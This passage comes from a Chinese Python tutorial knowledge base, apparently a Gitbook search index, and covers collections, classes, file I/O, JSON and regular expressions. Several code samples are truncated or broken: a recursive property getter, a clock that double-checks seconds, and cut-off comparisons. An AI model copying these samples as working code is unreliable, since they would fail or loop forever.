'李小龙' person[1] = 25 print(person) # 将列表转换成元组 fruits_list = ['apple', 'banana', 'orange'] fruits_tuple = tuple(fruits_list) print(fruits_tuple) if __name__ == '__main__': main() 这里有一个非常值得探讨的问题，我们已经有了列表这种数据结构，为什么还需要元组这样的类型呢？ 元组中的元素是无法修改的，事实上我们在项目中尤其是多线程环境（后面会讲到）中可能更喜欢使用的是那些不变对象（一方面因为对象状态不能修改，所以可以避免由此引起的不必要的程序错误，简单的说就是一个不变的对象要比可变的对象更加容易维护；另一方面因为没有任何一个线程能够修改不变对象的内部状态，一个不变对象自动就是线程安全的，这样就可以省掉处理同步化的开销。一个不变对象可以方便的被共享访问）。所以结论就是：如果不需要对元素进行添加、删除、修改的时候，可以考虑使用元组，当然如果一个方法要返回多个值，使用元组也是不错的选择。 元组在创建时间和占用的空间上面都优于列表。我们可以使用sys模块的getsizeof函数来检查存储同样的元素的元组和列表各自占用了多少内存空间 使用集合 Python中的集合跟数学上的集合是一致的，不允许有重复元素，而且可以进行交集、并集、差集等运算。 def main(): set1 = {1, 2, 3, 3, 3, 2} print(set1) print('Length =', len(set1)) set2 = set(range(1, 10)) print(set2) set1.add(4) set1.add(5) set2.update([11, 12]) print(set1) print(set2) set2.discard(5) # remove的元素如果不存在会引发KeyError if 4 in set2: set2.remove(4) print(set2) # 遍历集合容器 for elem in set2: print(elem ** 2, end=' ') print() # 将元组转换成集合 set3 = set((1, 2, 3, 3, 2, 1)) print(set3.pop()) print(set3) # 集合的交集、并集、差集、对称差运算 print(set1 & set2) # print(set1.intersection(set2)) print(set1 | set2) # print(set1.union(set2)) print(set1 - set2) # print(set1.difference(set2)) print(set1 ^ set2) # print(set1.symmetric_difference(set2)) # 判断子集和超集 print(set2 = set2) # print(set1.issuperset(set2)) print(set1 >= set3) # print(set1.issuperset(set3)) if __name__ == '__main__': main() 说明：Python中允许通过一些特殊的方法来为某种类型或数据结构自定义运算符（后面的章节中会讲到），上面的代码中我们对集合进行运算的时候可以调用集合对象的方法，也可以直接使用对应的运算符，例如&运算符跟intersection方法的作用就是一样的，但是使用运算符让代码更加直观。 使用字典 字典是另一种可变容器模型，类似于我们生活中使用的字典，它可以存储任意类型对象，与列表、集合不同的是，字典的每个元素都是由一个键和一个值组成的“键值对”，键和值通过冒号分开。下面的代码演示了如何定义和使用字典。 def main(): scores = {'aaron': 95, '白元芳': 78, '狄仁杰': 82} # 通过键可以获取字典中对应的值 print(scores['aaron']) print(scores['狄仁杰']) # 对字典进行遍历(遍历的其实是键再通过键取对应的值) for elem in scores: print('%s\\t--->\\t%d' % (elem, scores[elem])) # 更新字典中的元素 scores['白元芳'] = 65 scores['诸葛王朗'] = 71 scores.update(冷面=67, 方启鹤=85) print(scores) if '武则天' in scores: print(scores['武则天']) print(scores.get('武则天')) # get方法也是通过键获取对应的值但是可以设置默认值 print(scores.get('武则天', 60)) # 删除字典中的元素 print(scores.popitem()) print(scores.popitem()) print(scores.pop('aaron', 100)) # 清空字典 scores.clear() print(scores) if __name__ == '__main__': main() 练习 练习1：在屏幕上显示跑马灯文字 import os import time def main(): s = 'hello world' while True: os.system('cls') print(s) time.sleep(0.2) s = s[1:] + s[0] if __name__ == '__main__': main() 练习2：设计一个函数产生指定长度的验证码，验证码由大小写字母和数字构成 import random def main(): all_chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' length = len(all_chars) - 1 code = '' for _ in range(4): index = random.randint(0, length) code += all_chars[index] print(code) if __name__ == '__main__': main() 练习3：设计一个函数返回给定文件名的后缀名 def main(): filename = input('type filename: ') index = filename.rfind('.') print(filename[index+1:]) if __name__ == '__main__': main() 练习4：设计一个函数返回传入的列表中最大和第二大的元素的值 def findIts(x): maxListX = max(x) y = x[:] y.remove(maxListX) maxListY = max(y) return maxListX, maxListY def main(): x = findIts([1, 32, 56, 12, 45]) print(x) if __name__ == '__main__': main() 练习5:打印杨辉三角 def main(): row = int(input('row = ')) yh = [[]] * row for i in range(row): yh[i] = [None] * (i + 1) for j in range(i+1): if j == i or j == 0: yh[i][j] = 1 else: yh[i][j] = yh[i-1][j-1] + yh[i-1][j] for x in yh: for y in x: print(y, end=' ') print(end='\\n') if __name__ == '__main__': main() 练习6: 约瑟夫环问题 description 《幸运的基督徒》 有15个基督徒和15个非基督徒在海上遇险，为了能让一部分人活下来不得不将其中15个人扔到海里面去，有个人想了个办法就是大家围成一个圈，由某个人开始从1报数，报到9的人就扔到海里面，他后面的人接着从1开始报数，报到9的人继续扔到海里面，直到扔掉15个人。由于上帝的保佑，15个基督徒都幸免于难，问这些人最开始是怎么站的，哪些位置是基督徒哪些位置是非基督徒。 n = int(input('n = ')) m = int(input('m = ')) listMan = [True] * n droop = 0 count = 0 index = 0 while droop 列表移动，判断是否已经移除（置false），若未移除（true），则报数count+=1，否则不能报数 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-27 17:33:30 "},"知识库/04.编程开发/02.Python/06-面向对象编程基础.html":{"url":"知识库/04.编程开发/02.Python/06-面向对象编程基础.html","title":"06-面向对象编程基础","keywords":"","body":"面向对象编程基础 在Python中可以使用class关键字定义类，然后在类中通过之前学习过的函数来定义方法，这样就可以将对象的动态特征描述出来，代码如下所示。 class Student(object): # __init__是一个特殊方法用于在创建对象时进行初始化操作 # 通过这个方法我们可以为学生对象绑定name和age两个属性 def __init__(self, name, age): self.name = name self.age = age def study(self, course_name): print('%s正在学习%s.' % (self.name, course_name)) # PEP 8要求标识符的名字用全小写多个单词用下划线连接 # 但是很多程序员和公司更倾向于使用驼峰命名法(驼峰标识) def watch_av(self): if self.age 创建和使用对象 当我们定义好一个类之后，可以通过下面的方式来创建对象并给对象发消息 stu = Student('aaron', 18) stu.study('math') stu.watch_av() 访问可见性问题 对于上面的代码，有C++、Java、C#等编程经验的程序员可能会问，我们给Student对象绑定的name和age属性到底具有怎样的访问权限（也称为可见性）。因为在很多面向对象编程语言中，我们通常会将对象的属性设置为私有的（private）或受保护的（protected），简单的说就是不允许外界访问，而对象的方法通常都是公开的（public），因为公开的方法就是对象能够接受的消息。在Python中，属性和方法的访问权限只有两种，也就是公开的和私有的，如果希望属性是私有的，在给属性命名时可以用两个下划线作为开头，下面的代码可以验证这一点。 class Student: def __init__(self, foo): self.__foo = foo def __bar(self): print(self.__foo) print('__bar') def main(): test = Student('hello') test._Student__bar() print(test._Student__foo) if __name__ == \"__main__\": main() 在实际开发中，我们并不建议将属性设置为私有的，因为这会导致子类无法访问（后面会讲到）。所以大多数Python程序员会遵循一种命名惯例就是让属性名以单下划线开头来表示属性是受保护的，本类之外的代码在访问这样的属性时应该要保持慎重。这种做法并不是语法上的规则，单下划线开头的属性和方法外界仍然是可以访问的，所以更多的时候它是一种暗示或隐喻，关于这一点可以看看我的《Python - 那些年我们踩过的那些坑》文章中的讲解 面向对象的支柱 面向对象有三大支柱：封装、继承和多态。后面两个概念在下一个章节中进行详细的说明，这里我们先说一下什么是封装。我自己对封装的理解是“隐藏一切可以隐藏的实现细节，只向外界暴露（提供）简单的编程接口”。我们在类中定义的方法其实就是把数据和对数据的操作封装起来了，在我们创建了对象之后，只需要给对象发送一个消息（调用方法）就可以执行方法中的代码，也就是说我们只需要知道方法的名字和传入的参数（方法的外部视图），而不需要知道方法内部的实现细节（方法的内部视图）。 练习 练习1 定义一个类描述数字时钟 ''' @Description: @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-19 14:23:34 @LastEditors: AaronLuo @LastEditTime: 2020-03-19 15:12:11 ''' from time import sleep class Clock(object): def __init__(self, hour=0, minute=0, second=0): self.hour = hour self.minute = minute self.second = second def showTime(self): print('%02d:%02d:%02d' % (self.hour, self.minute, self.second)) # print(self.hour, ':', self.minute, ':', self.second) def caculate(self): self.second += 1 if self.second == 60: self.minute += 1 self.second = 0 if self.second == 60: self.hour += 1 self.minute = 0 if self.hour == 24: self.hour = 0 time = Clock(15, 6, 34) while True: time.caculate() sleep(1) time.showTime() 练习2：定义一个类描述平面上的点并提供移动点和计算到另一个点距离的方法。 ''' @Description: @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-19 14:23:34 @LastEditors: AaronLuo @LastEditTime: 2020-03-19 15:31:45 ''' from math import sqrt class Point(object): def __init__(self, x=0, y=0): self.x = x self.y = y def moveTo(self, x, y): self.x = x self.y = y def moveBy(self, dx, dy): self.x += dx self.y += dy def distanceTo(self, this): return sqrt((self.x - this.x)**2 + (self.y - this.y) ** 2) def __str__(self): return '(%s,%s)' % (str(self.x), str(self.y)) p1 = Point(3, 4) p2 = Point() print(p1) print(p1.distanceTo(p2)) Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-19 15:32:04 "},"知识库/04.编程开发/02.Python/07-面向对象进阶.html":{"url":"知识库/04.编程开发/02.Python/07-面向对象进阶.html","title":"07-面向对象进阶","keywords":"","body":"面向对象进阶 在前面的章节我们已经了解了面向对象的入门知识，知道了如何定义类，如何创建对象以及如何给对象发消息。为了能够更好的使用面向对象编程思想进行程序开发，我们还需要对Python中的面向对象编程进行更为深入的了解。 @property装饰器 之前我们讨论过Python中属性和方法访问权限的问题，虽然我们不建议将属性设置为私有的，但是如果直接将属性暴露给外界也是有问题的，比如我们没有办法检查赋给属性的值是否有效。我们之前的建议是将属性命名以单下划线开头，通过这种方式来暗示属性是受保护的，不建议外界直接访问，那么如果想访问属性可以通过属性的getter（访问器）和setter（修改器）方法进行对应的操作。如果要做到这点，就可以考虑使用@property包装器来包装getter和setter方法，使得对属性的访问既安全又方便，代码如下所示。 ''' @Description: @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-19 15:36:25 @LastEditors: AaronLuo @LastEditTime: 2020-03-19 15:51:16 ''' class Person(object): def __init__(self, name, age): self._name = name self._age = age @property def name(self): return self.name @property def age(self): return self._age @name.setter def name(self, name): self.name = name @age.setter def age(self, age): self._age = age def paly(self): if self._age __slots__魔法 我们讲到这里，不知道大家是否已经意识到，Python是一门动态语言。通常，动态语言允许我们在程序运行时给对象绑定新的属性或方法，当然也可以对已经绑定的属性和方法进行解绑定。但是如果我们需要限定自定义类型的对象只能绑定某些属性，可以通过在类中定义__slots__变量来进行限定。需要注意的是__slots__的限定只对当前类的对象生效，对子类并不起任何作用 ''' @Description: @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-19 15:36:25 @LastEditors: AaronLuo @LastEditTime: 2020-03-19 16:03:18 ''' class Person(object): __slots__ = ('_name', '_age', '_gender') def __init__(self, name, age): self._name = name self._age = age @property def name(self): return self.name @property def age(self): return self._age # @property # def gender(self): # return self._gender @name.setter def name(self, name): self.name = name @age.setter def age(self, age): self._age = age # @gender.setter # def gender(self, gender): # self._gender = gender def paly(self): if self._age 静态方法和类方法 之前，我们在类中定义的方法都是对象方法，也就是说这些方法都是发送给对象的消息。实际上，我们写在类中的方法并不需要都是对象方法，例如我们定义一个“三角形”类，通过传入三条边长来构造三角形，并提供计算周长和面积的方法，但是传入的三条边长未必能构造出三角形对象，因此我们可以先写一个方法来验证三条边长是否可以构成三角形，这个方法很显然就不是对象方法，因为在调用这个方法时三角形对象尚未创建出来（因为都不知道三条边能不能构成三角形），所以这个方法是属于三角形类而并不属于三角形对象的。我们可以使用静态方法来解决这类问题，代码如下所示 @staticmethod定义静态方法 from math import sqrt class Triangle(object): def __init__(self, a, b, c): self._a = a self._b = b self._c = c @staticmethod def is_valid(a, b, c): return a + b > c and b + c > a and a + c > b def perimeter(self): return self._a + self._b + self._c def area(self): half = self.perimeter() / 2 return sqrt(half * (half - self._a) * (half - self._b) * (half - self._c)) def main(): a, b, c = 3, 4, 5 # 静态方法和类方法都是通过给类发消息来调用的 if Triangle.is_valid(a, b, c): t = Triangle(a, b, c) print(t.perimeter()) # 也可以通过给类发消息来调用对象方法但是要传入接收消息的对象作为参数 # print(Triangle.perimeter(t)) print(t.area()) # print(Triangle.area(t)) else: print('无法构成三角形.') if __name__ == '__main__': main() 和静态方法比较类似，Python还可以在类中定义类方法，类方法的第一个参数约定名为cls，它代表的是当前类相关的信息的对象（类本身也是一个对象，有的地方也称之为类的元数据对象），通过这个参数我们可以获取和类相关的信息并且可以创建出类的对象，代码如下所示 from time import time, localtime, sleep class Clock(object): \"\"\"数字时钟\"\"\" def __init__(self, hour=0, minute=0, second=0): self._hour = hour self._minute = minute self._second = second @classmethod def now(cls): ctime = localtime(time()) return cls(ctime.tm_hour, ctime.tm_min, ctime.tm_sec) def run(self): \"\"\"走字\"\"\" self._second += 1 if self._second == 60: self._second = 0 self._minute += 1 if self._minute == 60: self._minute = 0 self._hour += 1 if self._hour == 24: self._hour = 0 def show(self): \"\"\"显示时间\"\"\" return '%02d:%02d:%02d' % \\ (self._hour, self._minute, self._second) def main(): # 通过类方法创建对象并获取系统时间 clock = Clock.now() while True: print(clock.show()) sleep(1) clock.run() if __name__ == '__main__': main() 类之间的关系 简单的说，类和类之间的关系有三种：is-a、has-a和use-a关系。 is-a关系也叫继承或泛化，比如学生和人的关系、手机和电子产品的关系都属于继承关系。 has-a关系通常称之为关联，比如部门和员工的关系，汽车和引擎的关系都属于关联关系；关联关系如果是整体和部分的关联，那么我们称之为聚合关系；如果整体进一步负责了部分的生命周期（整体和部分是不可分割的，同时同在也同时消亡），那么这种就是最强的关联关系，我们称之为合成关系。 use-a关系通常称之为依赖，比如司机有一个驾驶的行为（方法），其中（的参数）使用到了汽车，那么司机和汽车的关系就是依赖关系。 我们可以使用一种叫做UML（统一建模语言）的东西来进行面向对象建模，其中一项重要的工作就是把类和类之间的关系用标准化的图形符号描述出来。关于UML我们在这里不做详细的介绍，有兴趣的读者可以自行阅读《UML面向对象设计基础》一书。 利用类之间的这些关系，我们可以在已有类的基础上来完成某些操作，也可以在已有类的基础上创建新的类，这些都是实现代码复用的重要手段。复用现有的代码不仅可以减少开发的工作量，也有利于代码的管理和维护，这是我们在日常工作中都会使用到的技术手段。 继承和多态 刚才我们提到了，可以在已有类的基础上创建新类，这其中的一种做法就是让一个类从另一个类那里将属性和方法直接继承下来，从而减少重复代码的编写。提供继承信息的我们称之为父类，也叫超类或基类；得到继承信息的我们称之为子类，也叫派生类或衍生类。子类除了继承父类提供的属性和方法，还可以定义自己特有的属性和方法，所以子类比父类拥有的更多的能力，在实际开发中，我们经常会用子类对象去替换掉一个父类对象，这是面向对象编程中一个常见的行为，对应的原则称之为里氏替换原则。下面我们先看一个继承的例子。 class Person(object): \"\"\"人\"\"\" def __init__(self, name, age): self._name = name self._age = age @property def name(self): return self._name @property def age(self): return self._age @age.setter def age(self, age): self._age = age def play(self): print('%s正在愉快的玩耍.' % self._name) def watch_av(self): if self._age >= 18: print('%s正在观看爱情动作片.' % self._name) else: print('%s只能观看《熊出没》.' % self._name) class Student(Person): \"\"\"学生\"\"\" def __init__(self, name, age, grade): super().__init__(name, age) self._grade = grade @property def grade(self): return self._grade @grade.setter def grade(self, grade): self._grade = grade def study(self, course): print('%s的%s正在学习%s.' % (self._grade, self._name, course)) class Teacher(Person): \"\"\"老师\"\"\" def __init__(self, name, age, title): super().__init__(name, age) self._title = title @property def title(self): return self._title @title.setter def title(self, title): self._title = title def teach(self, course): print('%s%s正在讲%s.' % (self._name, self._title, course)) def main(): stu = Student('王大锤', 15, '初三') stu.study('数学') stu.watch_av() t = Teacher('骆昊', 38, '老叫兽') t.teach('Python程序设计') t.watch_av() if __name__ == '__main__': main() 子类在继承了父类的方法后，可以对父类已有的方法给出新的实现版本，这个动作称之为方法重写（override）。通过方法重写我们可以让父类的同一个行为在子类中拥有不同的实现版本，当我们调用这个经过子类重写的方法时，不同的子类对象会表现出不同的行为，这个就是多态（poly-morphism）。 ''' @Description: none @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-19 15:36:25 @LastEditors: AaronLuo @LastEditTime: 2020-03-19 18:07:44 ''' # 实现抽象类的包 from abc import ABCMeta, abstractmethod class Pet(object, metaclass=ABCMeta): \"\"\"宠物\"\"\" def __init__(self, nickname): self._nickname = nickname @abstractmethod def make_voice(self): \"\"\"发出声音\"\"\" pass class Dog(Pet): \"\"\"狗\"\"\" def make_voice(self): print('%s: 汪汪汪...' % self._nickname) class Cat(Pet): \"\"\"猫\"\"\" def make_voice(self): print('%s: 喵...喵...' % self._nickname) def main(): pets = [Dog('旺财'), Cat('凯蒂'), Dog('大黄')] for pet in pets: pet.make_voice() if __name__ == '__main__': main() 在上面的代码中，我们将Pet类处理成了一个抽象类，所谓抽象类就是不能够创建对象的类，这种类的存在就是专门为了让其他类去继承它。Python从语法层面并没有像Java或C#那样提供对抽象类的支持，但是我们可以通过abc模块的ABCMeta元类和abstractmethod包装器来达到抽象类的效果，如果一个类中存在抽象方法那么这个类就不能够实例化（创建对象）。上面的代码中，Dog和Cat两个子类分别对Pet类中的make_voice抽象方法进行了重写并给出了不同的实现版本，当我们在main函数中调用该方法时，这个方法就表现出了多态行为（同样的方法做了不同的事情）。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-19 18:21:10 "},"知识库/04.编程开发/02.Python/08-文件和异常.html":{"url":"知识库/04.编程开发/02.Python/08-文件和异常.html","title":"08-文件和异常","keywords":"","body":"文件和异常 在实际开发中，常常需要对程序中的数据进行持久化操作，而实现数据持久化最直接简单的方式就是将数据保存到文件中。说到“文件”这个词，可能需要先科普一下关于文件系统的知识，对于这个概念，维基百科上给出了很好的诠释，这里不再浪费笔墨。 在Python中实现文件的读写操作其实非常简单，通过Python内置的open函数，我们可以指定文件名、操作模式、编码信息等来获得操作文件的对象，接下来就可以对文件进行读写操作了。这里所说的操作模式是指要打开什么样的文件（字符文件还是二进制文件）以及做什么样的操作（读、写还是追加），具体的如下表所示。 操作模式 具体含义 'r' 读取 （默认） 'w' 写入（会先截断之前的内容） 'x' 写入，如果文件已经存在会产生异常 'a' 追加，将内容写入到已有文件的末尾 'b' 二进制模式 't' 文本模式（默认） '+' 更新（既可以读又可以写） 读写文本文件 读取文本文件时，需要在使用open函数时指定好带路径的文件名（可以使用相对路径或绝对路径）并将文件模式设置为'r'（如果不指定，默认值也是'r'），然后通过encoding参数指定编码（如果不指定，默认值是None，那么在读取文件时使用的是操作系统默认的编码），如果不能保证保存文件时使用的编码方式与encoding参数指定的编码方式是一致的，那么就可能因无法解码字符而导致读取失败。下面的例子演示了如何读取一个纯文本文件。 def main(): f = open('hello.txt', 'r', encoding='utf-8') print(f.read()) f.close() if __name__ == '__main__': main() 请注意上面的代码，如果open函数指定的文件并不存在或者无法打开，那么将引发异常状况导致程序崩溃。为了让代码有一定的健壮性和容错性，我们可以使用Python的异常机制对可能在运行时发生状况的代码进行适当的处理，如下所示。 def main(): f = None try: f = open('hello.txt', 'r', encoding='utf-8') print(f.read()) except FileNotFoundError: print('无法打开指定的文件!') except LookupError: print('指定了未知的编码!') except UnicodeDecodeError: print('读取文件时解码错误!') finally: if f: f.close() if __name__ == '__main__': main() 在Python中，我们可以将那些在运行时可能会出现状况的代码放在try代码块中，在try代码块的后面可以跟上一个或多个except来捕获可能出现的异常状况。例如在上面读取文件的过程中，文件找不到会引发FileNotFoundError，指定了未知的编码会引发LookupError，而如果读取文件时无法按指定方式解码会引发UnicodeDecodeError，我们在try后面跟上了三个except分别处理这三种不同的异常状况。最后我们使用finally代码块来关闭打开的文件，释放掉程序中获取的外部资源，由于finally块的代码不论程序正常还是异常都会执行到（甚至是调用了sys模块的exit函数退出Python环境，finally块都会被执行，因为exit函数实质上是引发了SystemExit异常），因此我们通常把finally块称为“总是执行代码块”，它最适合用来做释放外部资源的操作。如果不愿意在finally代码块中关闭文件对象释放资源，也可以使用上下文语法，通过with关键字指定文件对象的上下文环境并在离开上下文环境时自动释放文件资源，代码如下所示 def main(): try: with open('hello.txt', 'r', encoding='utf-8') as f: print(f.read()) except FileNotFoundError: print('无法打开指定的文件!') except LookupError: print('指定了未知的编码!') except UnicodeDecodeError: print('读取文件时解码错误!') if __name__ == '__main__': main() 除了使用文件对象的read方法读取文件之外，还可以使用for-in循环逐行读取或者用readlines方法将文件按行读取到一个列表容器中，代码如下所示 import time def main(): # 一次性读取整个文件内容 with open('hello.txt', 'r', encoding='utf-8') as f: print(f.read()) # 通过for-in循环逐行读取 with open('hello.txt', 'r', encoding='utf-8') as f: for line in f: print(line, end='') time.sleep(0.5) print() # 读取文件按行读取到列表中 with open('hello.txt', 'r', encoding='utf-8') as f: lines = f.readlines() print(lines) if __name__ == '__main__': main() 要将文本信息写入文件文件也非常简单，在使用open函数时指定好文件名并将文件模式设置为'w'即可。注意如果需要对文件内容进行追加式写入，应该将模式设置为'a'。如果要写入的文件不存在会自动创建文件而不是引发异常。下面的例子演示了如何将1-9999直接的素数分别写入三个文件中（1-99之间的素数保存在a.txt中，100-999之间的素数保存在b.txt中，1000-9999之间的素数保存在c.txt中）。 from math import sqrt def is_prime(n): \"\"\"判断素数的函数\"\"\" assert n > 0 for factor in range(2, int(sqrt(n)) + 1): if n % factor == 0: return False return True if n != 1 else False def main(): filenames = ('a.txt', 'b.txt', 'c.txt') fs_list = [] try: for filename in filenames: fs_list.append(open(filename, 'w', encoding='utf-8')) for number in range(1, 10000): if is_prime(number): if number 读写二进制文件 知道了如何读写文本文件要读写二进制文件也就很简单了，下面的代码实现了复制图片文件的功能。 def main(): try: with open('guido.jpg', 'rb') as fs1: data = fs1.read() print(type(data)) # with open('吉多.jpg', 'wb') as fs2: fs2.write(data) except FileNotFoundError as e: print('指定的文件无法打开.') except IOError as e: print('读写文件时出现错误.') print('程序执行结束.') if __name__ == '__main__': main() 读写JSON文件 通过上面的讲解，我们已经知道如何将文本数据和二进制数据保存到文件中，那么这里还有一个问题，如果希望把一个列表或者一个字典中的数据保存到文件中又该怎么做呢？答案是将数据以JSON格式进行保存。JSON是“JavaScript Object Notation”的缩写，它本来是JavaScript语言中创建对象的一种字面量语法，现在已经被广泛的应用于跨平台跨语言的数据交换，原因很简单，因为JSON也是纯文本，任何系统任何编程语言处理纯文本都是没有问题的。目前JSON基本上已经取代了XML作为异构系统间交换数据的事实标准。关于JSON的知识，更多的可以参考JSON的官方网站，从这个网站也可以了解到每种语言处理JSON数据格式可以使用的工具或三方库，下面是一个JSON的简单例子。 { \"name\": \"骆昊\", \"age\": 38, \"qq\": 957658, \"friends\": [\"王大锤\", \"白元芳\"], \"cars\": [ {\"brand\": \"BYD\", \"max_speed\": 180}, {\"brand\": \"Audi\", \"max_speed\": 280}, {\"brand\": \"Benz\", \"max_speed\": 320} ] } import json import requests def main(): with open('hello.json', 'r', encoding='utf-8') as f: jsonString = f.read() dictJson = json.loads(jsonString) print(dictJson['name']) if __name__ == '__main__': main() json模块主要有四个比较重要的函数，分别是： dump - 将Python对象按照JSON格式序列化到文件中 dumps - 将Python对象处理成JSON格式的字符串 load - 将文件中的JSON数据反序列化成对象 loads - 将字符串的内容反序列化成Python对象 这里出现了两个概念，一个叫序列化，一个叫反序列化。自由的百科全书维基百科上对这两个概念是这样解释的：“序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换为可以存储或传输的形式，这样在需要的时候能够恢复到原先的状态，而且通过序列化的数据重新获取字节时，可以利用这些字节来产生原始对象的副本（拷贝）。与这个过程相反的动作，即从一系列字节中提取数据结构的操作，就是反序列化（deserialization）”。 目前绝大多数网络数据服务（或称之为网络API）都是基于HTTP协议提供JSON格式的数据，关于HTTP协议的相关知识，可以看看阮一峰老师的《HTTP协议入门》，下面的例子演示了如何使用requests模块（封装得足够好的第三方网络访问模块）访问网络API获取国内新闻，如何通过json模块解析JSON数据 import json import requests def main(): req = requests.get('http://127.0.0.1:8080/test') print(json.loads(req.text)['name']) if __name__ == '__main__': main() 在Python中要实现序列化和反序列化除了使用json模块之外，还可以使用pickle和shelve模块，但是这两个模块是使用特有的序列化协议来序列化数据，因此序列化后的数据只能被Python识别。关于这两个模块的相关知识可以自己看看网络上的资料。另外，如果要了解更多的关于Python异常机制的知识，可以看看segmentfault上面的文章《总结：Python中的异常处理》，这篇文章不仅介绍了Python中异常机制的使用，还总结了一系列的最佳实践，很值得一读。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 17:13:17 "},"知识库/04.编程开发/02.Python/09-字符串和正则表达式.html":{"url":"知识库/04.编程开发/02.Python/09-字符串和正则表达式.html","title":"09-字符串和正则表达式","keywords":"","body":"字符串和正则表达式 在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要，正则表达式就是用于描述这些规则的工具，换句话说正则表达式是一种工具，它定义了字符串的匹配模式（如何检查一个字符串是否有跟某种模式匹配的部分或者从一个字符串中将与模式匹配的部分提取出来或者替换掉）。如果你在Windows操作系统中使用过文件查找并且在指定文件名时使用过通配符（*和?），那么正则表达式也是与之类似的用来进行文本匹配的工具，只不过比起通配符正则表达式更强大，它能更精确地描述你的需求（当然你付出的代价是书写一个正则表达式比打出一个通配符要复杂得多，要知道任何给你带来好处的东西都是有代价的，就如同学习一门编程语言一样），比如你可以编写一个正则表达式，用来查找所有以0开头，后面跟着2-3个数字，然后是一个连字号“-”，最后是7或8位数字的字符串（像028-12345678或0813-7654321），这不就是国内的座机号码吗。最初计算机是为了做数学运算而诞生的，处理的信息基本上都是数值，而今天我们在日常工作中处理的信息基本上都是文本数据，我们希望计算机能够识别和处理符合某些模式的文本，正则表达式就显得非常重要了。今天几乎所有的编程语言都提供了对正则表达式操作的支持，Python通过标准库中的re模块来支持正则表达式操作。 我们可以考虑下面一个问题：我们从某个地方（可能是一个文本文件，也可能是网络上的一则新闻）获得了一个字符串，希望在字符串中找出手机号和座机号。当然我们可以设定手机号是11位的数字（注意并不是随机的11位数字，因为你没有见过“25012345678”这样的手机号吧）而座机号跟上一段中描述的模式相同，如果不使用正则表达式要完成这个任务就会很麻烦。 关于正则表达式的相关知识，大家可以阅读一篇非常有名的博客叫《正则表达式30分钟入门教程》，读完这篇文章后你就可以看懂下面的表格，这是我们对正则表达式中的一些基本符号进行的扼要总结。 符号 解释 示例 说明 . 匹配任意字符 b.t 可以匹配bat / but / b#t / b1t等 \\w 匹配字母/数字/下划线 b\\wt 可以匹配bat / b1t / b_t等 但不能匹配b#t \\s 匹配空白字符（包括\\r、\\n、\\t等） love\\syou 可以匹配love you \\d 匹配数字 \\d\\d 可以匹配01 / 23 / 99等 \\b 匹配单词的边界 \\bThe\\b ^ 匹配字符串的开始 ^The 可以匹配The开头的字符串 $ 匹配字符串的结束 .exe$ 可以匹配.exe结尾的字符串 \\W 匹配非字母/数字/下划线 b\\Wt 可以匹配b#t / b@t等 但不能匹配but / b1t / b_t等 \\S 匹配非空白字符 love\\Syou 可以匹配love#you等 但不能匹配love you \\D 匹配非数字 \\d\\D 可以匹配9a / 3# / 0F等 \\B 匹配非单词边界 \\Bio\\B [] 匹配来自字符集的任意单一字符 [aeiou] 可以匹配任一元音字母字符 匹配不在字符集中的任意单一字符 aeiou 可以匹配任一非元音字母字符 * 匹配0次或多次 \\w* + 匹配1次或多次 \\w+ ? 匹配0次或1次 \\w? {N} 匹配N次 \\w{3} {M,} 匹配至少M次 \\w{3,} {M,N} 匹配至少M次至多N次 \\w{3,6} \\ 分支 foo\\ bar 可以匹配foo或者bar (?#) 注释 (exp) 匹配exp并捕获到自动命名的组中 (?exp) 匹配exp并捕获到名为name的组中 (?:exp) 匹配exp但是不捕获匹配的文本 (?=exp) 匹配exp前面的位置 \\b\\w+(?=ing) 可以匹配I'm dancing中的danc (? 匹配exp后面的位置 (? 可以匹配I love dancing and reading中的第一个ing (?!exp) 匹配后面不是exp的位置 (? 匹配前面不是exp的位置 *? 重复任意次，但尽可能少重复 a.b a.?b 将正则表达式应用于aabab，前者会匹配整个字符串aabab，后者会匹配aab和ab两个字符串 +? 重复1次或多次，但尽可能少重复 ?? 重复0次或1次，但尽可能少重复 {M,N}? 重复M到N次，但尽可能少重复 {M,}? 重复M次以上，但尽可能少重复 Python对正则表达式的支持 Python提供了re模块来支持正则表达式相关操作，下面是re模块中的核心函数 函数 说明 compile(pattern, flags=0) 编译正则表达式返回正则表达式对象 match(pattern, string, flags=0) 用正则表达式匹配字符串 成功返回匹配对象 否则返回None search(pattern, string, flags=0) 搜索字符串中第一次出现正则表达式的模式 成功返回匹配对象 否则返回None split(pattern, string, maxsplit=0, flags=0) 用正则表达式指定的模式分隔符拆分字符串 返回列表 sub(pattern, repl, string, count=0, flags=0) 用指定的字符串替换原字符串中与正则表达式匹配的模式 可以用count指定替换的次数 fullmatch(pattern, string, flags=0) match函数的完全匹配（从字符串开头到结尾）版本 findall(pattern, string, flags=0) 查找字符串所有与正则表达式匹配的模式 返回字符串的列表 finditer(pattern, string, flags=0) 查找字符串所有与正则表达式匹配的模式 返回一个迭代器 purge() 清除隐式编译的正则表达式的缓存 re.I / re.IGNORECASE 忽略大小写匹配标记 re.M / re.MULTILINE 多行匹配标记 说明：上面提到的re模块中的这些函数，实际开发中也可以用正则表达式对象的方法替代对这些函数的使用，如果一个正则表达式需要重复的使用，那么先通过compile函数编译正则表达式并创建出正则表达式对象无疑是更为明智的选择。 例子1：验证输入用户名和QQ号是否有效并给出对应的提示信息。 \"\"\" 验证输入用户名和QQ号是否有效并给出对应的提示信息 要求：用户名必须由字母、数字或下划线构成且长度在6~20个字符之间，QQ号是5~12的数字且首位不能为0 \"\"\" import re def main(): username = input('请输入用户名: ') qq = input('请输入QQ号: ') # match函数的第一个参数是正则表达式字符串或正则表达式对象 # 第二个参数是要跟正则表达式做匹配的字符串对象 m1 = re.match(r'^[0-9a-zA-Z_]{6,20}$', username) if not m1: print('请输入有效的用户名.') m2 = re.match(r'^[1-9]\\d{4,11}$', qq) if not m2: print('请输入有效的QQ号.') if 